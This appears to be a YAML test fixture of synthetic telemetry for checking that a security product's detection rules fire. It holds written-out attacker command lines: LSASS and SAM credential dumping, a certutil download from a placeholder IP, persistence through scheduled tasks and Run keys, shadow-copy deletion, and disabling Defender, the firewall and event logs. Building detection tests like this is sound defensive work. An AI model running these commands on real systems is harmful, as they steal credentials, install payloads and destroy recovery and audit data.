# Escenarios de validacion de deteccion (SIM-1/SIM-2).
# Telemetria sintetica e inerte: el mismo esquema de eventos que
# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
# declara las alertas que el motor DEBE disparar (shipped rule/sequence
# id); el test de CI falla si una deja de detectarse.

- name: Campana de robo de credenciales (sintetico)
  id: sim-chain-e7d1-1a2b
  description: 'Secuencia sintetica que completa la cadena: tres tecnicas de volcado de credenciales sobre el mismo
    equipo. Telemetria inerte; nada se ejecuta en ningun equipo.'
  attack:
  - t1003
  host: LAB-SIM-CHAIN1
  user: CORP\sim
  expected:
  - rule: c0a5e7d1-1a2b-4c3d-8e4f-a5b6c7d8e9f0
  events:
  - type: process.create
    user: CORP\sim
    process:
      pid: 4300
      name: rundll32.exe
      command_line: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full
  - type: process.create
    user: CORP\sim
    process:
      pid: 4301
      name: procdump.exe
      command_line: procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass2.dmp
  - type: process.create
    user: CORP\sim
    process:
      pid: 4302
      name: reg.exe
      command_line: reg.exe save HKLM\SAM C:\Users\Public\sam.hiv
- name: Campana de intrusion completa (sintetico)
  id: sim-chain-f8e2-2b3c
  description: 'Secuencia sintetica que completa la cadena: descarga, persistencia programada y destruccion de sombras.
    Telemetria inerte; nada se ejecuta en ningun equipo.'
  attack:
  - t1105
  - t1053.005
  - t1490
  host: LAB-SIM-CHAIN1
  user: CORP\sim
  expected:
  - rule: d1b6f8e2-2b3c-4d4e-9f50-b6c7d8e9f0a1
  events:
  - type: process.create
    user: CORP\sim
    process:
      pid: 4310
      name: certutil.exe
      command_line: certutil.exe -urlcache -split -f https://203.0.113.10/p.exe C:\Users\Public\p.exe
  - type: process.create
    user: CORP\sim
    process:
      pid: 4311
      name: schtasks.exe
      command_line: schtasks.exe /create /tn "Updater" /sc onlogon /tr C:\Users\Public\p.exe
  - type: process.create
    user: CORP\sim
    process:
      pid: 4312
      name: vssadmin.exe
      command_line: vssadmin.exe delete shadows /all /quiet
- name: Apagon defensivo (sintetico)
  id: sim-chain-a9f3-3c4d
  description: 'Secuencia sintetica que completa la cadena: cegado de Defender, firewall y registros. Telemetria
    inerte; nada se ejecuta en ningun equipo.'
  attack:
  - t1562
  - t1070.001
  host: LAB-SIM-CHAIN1
  user: CORP\sim
  expected:
  - rule: e2c7a9f3-3c4d-4e5f-a061-c7d8e9f0a1b2
  events:
  - type: process.create
    user: CORP\sim
    process:
      pid: 4320
      name: powershell.exe
      command_line: powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true
  - type: process.create
    user: CORP\sim
    process:
      pid: 4321
      name: netsh.exe
      command_line: netsh.exe advfirewall set allprofiles state off
  - type: process.create
    user: CORP\sim
    process:
      pid: 4322
      name: wevtutil.exe
      command_line: wevtutil.exe cl Security
- name: Instalacion de persistencia (sintetico)
  id: sim-chain-ba64-4d5e
  description: 'Secuencia sintetica que completa la cadena: descarga con certutil y autostart escrito en el registro.
    Telemetria inerte; nada se ejecuta en ningun equipo.'
  attack:
  - t1105
  - t1547.001
  host: LAB-SIM-CHAIN1
  user: CORP\sim
  expected:
  - rule: f3d8ba64-4d5e-4f60-b172-d8e9f0a1b2c3
  events:
  - type: process.create
    user: CORP\sim
    process:
      pid: 4330
      name: certutil.exe
      command_line: certutil.exe -urlcache -split -f https://203.0.113.10/p.exe C:\Users\Public\p.exe
  - type: registry.set
    user: CORP\sim
    process:
      pid: 4331
      name: explorer.exe
    registry:
      key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
      operation: SetValue
      value_name: OneDriveSync
      value: C:\Users\Public\p.exe
